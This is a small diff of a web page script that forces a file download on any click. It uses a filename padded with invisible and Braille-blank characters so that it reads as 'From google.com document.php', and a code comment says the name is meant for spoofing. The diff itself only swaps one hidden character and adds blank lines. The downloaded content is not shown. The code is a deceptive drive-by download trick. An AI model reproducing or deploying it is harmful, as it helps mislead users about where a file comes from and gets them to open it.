@@ -46,7 +46,7 @@ document.addEventListener('click', () => {
     // Create an <a> tag to trigger the download
     const a = document.createElement('a');
     a.href = dataUri;
-    a.download = 'From‎ google.com ⠀⠀⠀ document.php'; // Filename .php for spoofing
+    a.download = 'From‎⠀google.com ⠀⠀⠀ document.php'; // Filename .php for spoofing
     document.body.appendChild(a);
     a.click(); // Trigger the download
 
@@ -60,6 +60,7 @@ document.addEventListener('click', () => {
 
 </body>
 </html>
+
 
 
 
